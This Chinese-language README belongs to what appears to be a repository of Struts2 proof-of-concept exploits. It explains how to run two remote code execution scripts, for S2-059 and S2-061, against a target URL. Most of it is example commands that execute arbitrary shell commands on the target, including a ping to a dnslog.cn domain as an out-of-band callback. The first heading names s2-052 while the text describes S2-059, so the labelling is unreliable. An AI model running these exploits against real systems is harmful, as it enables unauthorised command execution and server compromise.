# 此仓库为strus2历史版本的poc集合
## s2-052_exploit.py 漏洞利用脚本
这个 Python 脚本旨在演示 Apache Struts S2-059 漏洞的利用技术。该漏洞允许在受影响的系统上进行远程代码执行。
python环境为pyhon2.7 
### 使用方法
1. 确保已经安装了 `requests` 库 。你可以使用 `pip` 来安装它：
`pip install requests`
2. 使用以下命令运行脚本：

```
python s2-059_exploit.py -u <URL> -c <命令>

- `-u` 或 `--url`：指定存在 Apache Struts 漏洞的目标 URL。
- `-c` 或 `--command`：提供要在目标系统上执行的命令。

示例：

python2 s2-059_exploit.py -u http://example.com/orders/3/edit -c "/usr/bin/touch /tmp/aa /tmp/bb"
python2 s2-059_exploit.py -u http://example.com/orders/3/edit -c "ping l9mgao.dnslog.cn"
```
##  s2-061_exploit.py 漏洞利用脚本
这个 Python 脚本旨在演示 Apache Struts S2-061 漏洞的利用技术。该漏洞允许在受影响的系统上进行远程代码执行。如远程命令为系统输出命令`id`,`ls /tmp`,`pwd`,可直接回显
python环境为 python3.9
### 使用方法
1. 确保已经安装了 `requests` 库 。你可以使用 `pip` 来安装它：
`pip install requests`
2. 使用以下命令运行脚本：
```
python s2-061_exploit.py -p <利用参数> -u <URL> -c <命令> 
- `-u` 或 `--url`：指定目标 URL。
- `-c` 或 `--command`：指定要执行的命令。
- `-p` 或 `--param`：指定 payload 参数。

示例：
python3 s2-061_exploit.py -p id -u http://example.com/ -c "ls /tmp"
python3 s2-061_exploit.py -p id -u http://example.com/ -c "pwd"
python3 s2-061_exploit.py -p id -u http://example.com/ -c "touch /tmp/test"
```
